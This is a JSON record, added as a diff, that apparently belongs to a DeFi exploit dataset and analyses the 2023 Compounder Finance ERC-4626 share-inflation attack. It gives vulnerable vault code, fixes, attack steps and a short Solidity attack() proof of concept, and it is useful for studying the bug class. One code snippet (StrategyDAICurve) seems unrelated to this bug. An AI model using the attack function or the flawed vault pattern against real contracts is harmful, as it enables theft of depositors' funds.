@@ -1,0 +1,36 @@
+{
+ "id": "2023__2023-06-12_CompounderFinance_ERC4626Inflation",
+ "source_file": "2023/2023-06-12_CompounderFinance_ERC4626Inflation.md",
+ "title": "Compounder Finance — ERC-4626 Inflation Attack Analysis",
+ "date": "2023-06-12",
+ "protocol": "Compounder Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$27,174 (small first-depositor attack; original entry had erroneous \"K\" suffix making it read as $27.17B)",
+ "loss_usd": 27174.0,
+ "root_cause": "ERC-4626 vault first depositor attack (share price inflation)",
+ "attack_tx": "0xcff84cc1...",
+ "vulnerable_contract": "0xaf274e91...",
+ "classes": [
+  "integer-precision"
+ ],
+ "code_before": [
+  "// ❌ ERC-4626 first depositor vulnerability\nfunction convertToShares(uint256 assets) public view returns (uint256) {\n    uint256 supply = totalSupply();\n    // ❌ If supply is 1 and totalAssets is very large,\n    // victim's assets * 1 / totalAssets → 0 (rounded down)\n    return supply == 0 ? assets : assets * supply / totalAssets();\n}\n\nfunction deposit(uint256 assets, address receiver) public returns (uint256 shares) {\n    shares = convertToShares(assets);\n    // ❌ shares = 0 → victim loses assets\n    require(shares > 0, \"Zero shares\");  // vulnerable if this check is absent\n    _mint(receiver, shares);\n    asset.transferFrom(msg.sender, address(this), assets);\n}",
+  "// File: StrategyDAICurve.sol\n  function getPricePerFullShare() external view returns (uint);  // ❌\n\n// ...\n\n  function get_virtual_price() external view returns (uint);  // ❌\n\n// ...\n\n    function balanceOfYYCRVinYCRV() public view returns (uint) {\n        return balanceOfYYCRV().mul(yERC20(yycrv).getPricePerFullShare()).div(1e18);  // ❌\n    }\n\n// ...\n\n    function balanceOfYYCRVinyTUSD() public view returns (uint) {\n        return balanceOfYYCRVinYCRV().mul(ICurveFi(curve).get_virtual_price()).div(1e18);  // ❌\n    }\n\n// ...\n\n    function balanceOfYCRVyTUSD() public view returns (uint) {\n        return balanceOfYCRV().mul(ICurveFi(curve).get_virtual_price()).div(1e18);  // ❌\n    }"
+ ],
+ "code_after": [
+  "// ✅ Fix: virtual balance pattern\nfunction totalAssets() public view returns (uint256) {\n    return asset.balanceOf(address(this)) + VIRTUAL_SHARES; // ✅ minimum offset\n}\nuint256 constant VIRTUAL_SHARES = 1000; // prevents rounding errors",
+  "// ✅ Use OpenZeppelin ERC4626 _decimalsOffset()\nfunction _decimalsOffset() internal view virtual override returns (uint8) {\n    return 3; // ✅ prevents rounding errors with 1000x virtual shares\n}"
+ ],
+ "steps": [
+  "1. Deposit 1 wei to vault → obtain 1 share",
+  "2. Directly transfer large amount of cDAI (donate)",
+  "1 share = millions of cDAI",
+  "3. Victim calls deposit(large amount)",
+  "convertToShares → rounds down → 0 shares",
+  "4. Attacker redeems 1 share → acquires all assets"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────┐\n│  1. Deposit 1 wei to vault → obtain 1 share     │\n└──────────────────────┬───────────────────┘\n                       ▼\n┌──────────────────────────────────────────┐\n│  2. Directly transfer large amount of cDAI (donate)         │\n│     totalAssets surges, share price skyrockets   │\n│     1 share = millions of cDAI               │\n└──────────────────────┬───────────────────┘\n                       ▼\n┌──────────────────────────────────────────┐\n│  3. Victim calls deposit(large amount)              │\n│     convertToShares → rounds down → 0 shares │\n│     Victim's assets absorbed into vault              │\n└──────────────────────┬───────────────────┘\n                       ▼\n┌──────────────────────────────────────────┐\n│  4. Attacker redeems 1 share",
+  "function attack() external {\n    // 1. Deposit 1 wei to obtain 1 share\n    cDAI.approve(address(vault), 1);\n    vault.deposit(1, address(this));\n\n    // 2. Directly transfer large amount to vault (totalAssets inflation)\n    uint256 donateAmount = 1_000_000e18;\n    cDAI.transfer(address(vault), donateAmount);\n    // share price: 1 share = 1_000_001 cDAI\n\n    // 3. When victim deposits, shares = 0 → assets stolen\n\n    // 4. Attacker redeems all shares\n    vault.redeem(1, address(this), address(this));\n    // → recovers donateAmount + all victim assets\n}"
+ ]
+}
